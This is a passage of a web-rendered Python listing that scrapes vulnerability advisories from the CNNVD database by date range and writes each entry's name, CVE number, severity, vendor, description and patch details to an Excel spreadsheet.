class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr</span></span><br><span class="line"><span class="comment">#import urllib.request/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> http.cookiejar</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">运行方法：</span></span><br><span class="line"><span class="string">python vulnerabilities_crawler 2017-10-01 2017-10-07 178</span></span><br><span class="line"><span class="string">第一个为开始时间，第二个为结束时间，第三个为总页数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得漏洞详情链接列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_url_list</span><span class="params">(url,start_time,end_time)</span>:</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 4.1.2; Nexus 7 Build/JZ054K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'http://cnnvd.org.cn/web/vulnerability/queryLds.tag'</span></span><br><span class="line">    &#125;    </span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'qstartdate'</span>:<span class="string">'2017-10-30'</span>,                <span class="comment">#---------------》开始日期</span></span><br><span class="line">        <span class="string">'qenddate'</span>:<span class="string">'2017-10-31'</span>                    <span class="comment">#---------------》结束日期</span></span><br><span class="line">    &#125;</span><br><span class="line">    data[<span class="string">'qstartdate'</span>] = start_time </span><br><span class="line">    data[<span class="string">'qenddate'</span>] = end_time</span><br><span class="line">    data = parse.urlencode(data).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    vulnerabilities_url_html = urllib.request.Request(url,headers=header,data=data)</span><br><span class="line">    vulnerabilities_url_cookie = http.cookiejar.CookieJar()</span><br><span class="line">    vulnerabilities_url_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(vulnerabilities_url_cookie))</span><br><span class="line">    vulnerabilities_url_html = vulnerabilities_url_opener.open(vulnerabilities_url_html)</span><br><span class="line">    vulnerabilities_url_html = zlib.decompress(vulnerabilities_url_html.read(), <span class="number">16</span>+zlib.MAX_WBITS)</span><br><span class="line">    vulnerabilities_url_html = vulnerabilities_url_html.decode()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#提取漏洞详情链接</span></span><br><span class="line">    response = <span class="string">r'href="(.+?)" target="_blank" class="a_title2"'</span></span><br><span class="line">    vulnerabilities_link_list = re.compile(response).findall(vulnerabilities_url_html)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#添加http前序</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> vulnerabilities_link_list:</span><br><span class="line">        vulnerabilities_lists.append(<span class="string">'http://cnnvd.org.cn'</span>+vulnerabilities_link_list[i])</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">"已完成爬行第%d个漏洞链接"</span>%i)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞信息爬取函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_data</span><span class="params">(url)</span>:</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, sdch'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    vulnerabilities_data_html = urllib.request.Request(url,headers=header)</span><br><span class="line">    vulnerabilities_data_cookie = http.cookiejar.CookieJar()</span><br><span class="line">    vulnerabilities_data_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(vulnerabilities_data_cookie))</span><br><span class="line">    vulnerabilities_data_html = vulnerabilities_data_opener.open(vulnerabilities_data_html)</span><br><span class="line">    vulnerabilities_data_html = zlib.decompress(vulnerabilities_data_html.read(), <span class="number">16</span>+zlib.MAX_WBITS)</span><br><span class="line">    vulnerabilities_data_html = vulnerabilities_data_html.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> vulnerabilities_result_list</span><br><span class="line">    vulnerabilities_result_list=[]    <span class="comment">#抓取信息列表命名</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#添加漏洞信息详情</span></span><br><span class="line">    vulnerabilities_detainled_soup1 = BeautifulSoup(vulnerabilities_data_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    vulnerabilities_detainled_data = vulnerabilities_detainled_soup1.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'detail_xq w770'</span>&#125;)    <span class="comment">##定义 漏洞信息详情 块的soup</span></span><br><span class="line">    vulnerabilities_detainled_data = vulnerabilities_detainled_data.decode()</span><br><span class="line">    vulnerabilities_detainled_soup = BeautifulSoup(vulnerabilities_detainled_data,<span class="string">'html.parser'</span>)    <span class="comment">#二次匹配    </span></span><br><span class="line"></span><br><span class="line">    vulnerabilities_detainled_data_list = vulnerabilities_detainled_soup.find_all(<span class="string">'li'</span>)    <span class="comment">#标签a信息汇总    </span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_name = vulnerabilities_detainled_soup.h2.string    <span class="comment">#漏洞名称</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_name = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_name)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_cnnvd_num = vulnerabilities_detainled_soup.span.string    <span class="comment">#cnnvd编号</span></span><br><span class="line">        vulnerabilities_cnnvd_num = re.findall(<span class="string">r"\：([\s\S]*)"</span>,vulnerabilities_cnnvd_num)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_cnnvd_num = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_cnnvd_num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:                            <span class="comment">#漏洞等级</span></span><br><span class="line">        vulnerabilities_rank = vulnerabilities_detainled_soup.a.decode()</span><br><span class="line">        vulnerabilities_rank = re.search(<span class="string">u'([\u4e00-\u9fa5]+)'</span>,vulnerabilities_rank).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_rank = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_rank)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_cve_html = vulnerabilities_detainled_data_list[<span class="number">2</span>].decode()    <span class="comment">#漏洞cve编号</span></span><br><span class="line">    vulnerabilities_cve_soup = BeautifulSoup(vulnerabilities_cve_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_cve = vulnerabilities_cve_soup.a.string</span><br><span class="line">        vulnerabilities_cve = vulnerabilities_cve.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>).replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_cve = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_cve)</span><br><span class="line">    </span><br><span class="line">    vulnerabilities_type_html = vulnerabilities_detainled_data_list[<span class="number">3</span>].decode()    <span class="comment">#漏洞类型</span></span><br><span class="line">    vulnerabilities_type_soup = BeautifulSoup(vulnerabilities_type_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_type = vulnerabilities_type_soup.a.string</span><br><span class="line">        vulnerabilities_type = vulnerabilities_type.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>).replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_type = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_type)</span><br><span class="line">    </span><br><span class="line">    vulnerabilities_time_html = vulnerabilities_detainled_data_list[<span class="number">4</span>].decode()    <span class="comment">#发布时间</span></span><br><span class="line">    vulnerabilities_time_soup = BeautifulSoup(vulnerabilities_time_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:    </span><br><span class="line">        vulnerabilities_time = vulnerabilities_time_soup.a.string</span><br><span class="line">        vulnerabilities_time = vulnerabilities_time.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_time = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_time)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_attack_html = vulnerabilities_detainled_data_list[<span class="number">5</span>].decode()    <span class="comment">#威胁类型</span></span><br><span class="line">    vulnerabilities_attack_soup = BeautifulSoup(vulnerabilities_attack_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:    </span><br><span class="line">        vulnerabilities_attack = vulnerabilities_attack_soup.a.string</span><br><span class="line">        vulnerabilities_attack = vulnerabilities_attack.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_attack = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_attack)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_update_html = vulnerabilities_detainled_data_list[<span class="number">6</span>].decode()    <span class="comment">#更新时间</span></span><br><span class="line">    vulnerabilities_update_soup = BeautifulSoup(vulnerabilities_update_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_update = vulnerabilities_update_soup.a.string</span><br><span class="line">        vulnerabilities_update = vulnerabilities_update.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_update = <span class="string">''</span>    </span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_update)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_firm_html = vulnerabilities_detainled_data_list[<span class="number">7</span>].decode()    <span class="comment">#厂商</span></span><br><span class="line">    vulnerabilities_firm_soup = BeautifulSoup(vulnerabilities_firm_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_firm = vulnerabilities_firm_soup.a.string</span><br><span class="line">        vulnerabilities_firm = vulnerabilities_firm.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_firm = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_firm)</span><br><span class="line"></span><br><span class="line">    vulnerabilities_source_html = vulnerabilities_detainled_data_list[<span class="number">8</span>].decode()    <span class="comment">#漏洞来源</span></span><br><span class="line">    vulnerabilities_source_soup = BeautifulSoup(vulnerabilities_source_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_source = vulnerabilities_source_soup.a.string</span><br><span class="line">        vulnerabilities_source = vulnerabilities_source.replace(<span class="string">"\r"</span>,<span class="string">""</span>).replace(<span class="string">"\t"</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_source = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_source)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#添加漏洞简介详情</span></span><br><span class="line">    vulnerabilities_title_html = vulnerabilities_detainled_soup1.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj'</span>&#125;)    <span class="comment">#定义 漏洞简介 块的soup</span></span><br><span class="line">    vulnerabilities_title_html = vulnerabilities_title_html.decode()</span><br><span class="line">    vulnerabilities_title_soup2 = BeautifulSoup(vulnerabilities_title_html,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_titles1 = vulnerabilities_title_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_titles2 = vulnerabilities_title_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">1</span>].string</span><br><span class="line">        vulnerabilities_titles = vulnerabilities_titles1 + vulnerabilities_titles2</span><br><span class="line">        vulnerabilities_titles = vulnerabilities_titles.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_titles = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_titles)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#漏洞公告</span></span><br><span class="line">    vulnerabilities_notice_html = vulnerabilities_detainled_soup1.find(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)    <span class="comment">#定义 漏洞公告 块的soup</span></span><br><span class="line">    vulnerabilities_notice_html = vulnerabilities_notice_html.decode()</span><br><span class="line">    vulnerabilities_notice_soup2 = BeautifulSoup(vulnerabilities_notice_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_notice1 = vulnerabilities_notice_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_notice2 = vulnerabilities_notice_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">1</span>].string</span><br><span class="line">        vulnerabilities_notice = vulnerabilities_notice1+vulnerabilities_notice2</span><br><span class="line">        vulnerabilities_notice = vulnerabilities_notice.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_notice = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_notice)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#参考网址</span></span><br><span class="line">    vulnerabilities_reference_html = vulnerabilities_detainled_soup1.find_all(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)[<span class="number">1</span>]    <span class="comment">#定义 参考网址 块的soup</span></span><br><span class="line">    vulnerabilities_reference_html = vulnerabilities_reference_html.decode()</span><br><span class="line">    vulnerabilities_reference_soup2 = BeautifulSoup(vulnerabilities_reference_html,<span class="string">'html.parser'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_reference = vulnerabilities_reference_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">1</span>].string</span><br><span class="line">        vulnerabilities_reference = vulnerabilities_reference.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">'链接:'</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_reference = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_reference)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">#受影响实体</span></span><br><span class="line">    vulnerabilities_effect_html = vulnerabilities_detainled_soup1.find_all(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)[<span class="number">2</span>]    <span class="comment">#定义 受影响实体 块的soup</span></span><br><span class="line">    vulnerabilities_effect_html = vulnerabilities_effect_html.decode()</span><br><span class="line">    vulnerabilities_effect_soup2 = BeautifulSoup(vulnerabilities_effect_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_effect = vulnerabilities_effect_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_effect = vulnerabilities_effect.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vulnerabilities_effect = vulnerabilities_effect_soup2.find_all(name=<span class="string">'a'</span>)[<span class="number">0</span>].string</span><br><span class="line">            vulnerabilities_effect = vulnerabilities_effect.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)        </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            vulnerabilities_effect = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_effect)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#补丁</span></span><br><span class="line">    vulnerabilities_patch_html = vulnerabilities_detainled_soup1.find_all(<span class="string">'div'</span>,attrs=&#123;<span class="string">'class'</span>:<span class="string">'d_ldjj m_t_20'</span>&#125;)[<span class="number">3</span>]    <span class="comment">#定义 补丁 块的soup</span></span><br><span class="line">    vulnerabilities_patch_html = vulnerabilities_patch_html.decode()</span><br><span class="line">    vulnerabilities_patch_soup2 = BeautifulSoup(vulnerabilities_patch_html,<span class="string">'html.parser'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        vulnerabilities_patch = vulnerabilities_patch_soup2.find_all(name=<span class="string">'p'</span>)[<span class="number">0</span>].string</span><br><span class="line">        vulnerabilities_patch = vulnerabilities_patch.replace(<span class="string">'\n'</span>,<span class="string">''</span>).replace(<span class="string">'\r'</span>,<span class="string">''</span>).replace(<span class="string">'\t'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        vulnerabilities_patch = <span class="string">''</span></span><br><span class="line">    vulnerabilities_result_list.append(vulnerabilities_patch)</span><br><span class="line"></span><br><span class="line"><span class="comment">#漏洞信息写入excel</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vulnerabilities_excel</span><span class="params">(excel)</span>:</span></span><br><span class="line">    workbook = xlsxwriter.Workbook(<span class="string">'vulnerabilities_data.xlsx'</span>)</span><br><span class="line">    worksheet = workbook.add_worksheet()</span><br><span class="line"></span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    col = <span class="number">0</span></span><br><span class="line">    worksheet.write(row,<span class="number">0</span>,<span class="string">'漏洞名称'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">1</span>,<span class="string">'CNNVD编号'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">2</span>,<span class="string">'危害等级'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">3</span>,<span class="string">'CVE编号'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">4</span>,<span class="string">'漏洞类型'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">5</span>,<span class="string">'发布时间'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">6</span>,<span class="string">'攻击途径'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">7</span>,<span class="string">'更新时间'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">8</span>,<span class="string">'厂商'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">9</span>,<span class="string">'漏洞来源'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">10</span>,<span class="string">'漏洞简介'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">11</span>,<span class="string">'漏洞公告'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">12</span>,<span class="string">'参考链接'</span>)</span><br><span class="line">    worksheet.write(row,<span class="number">13</span>,<span class="string">'受影响实体'</span>)</span><br><span class="line">    worksheet.write(row,<span 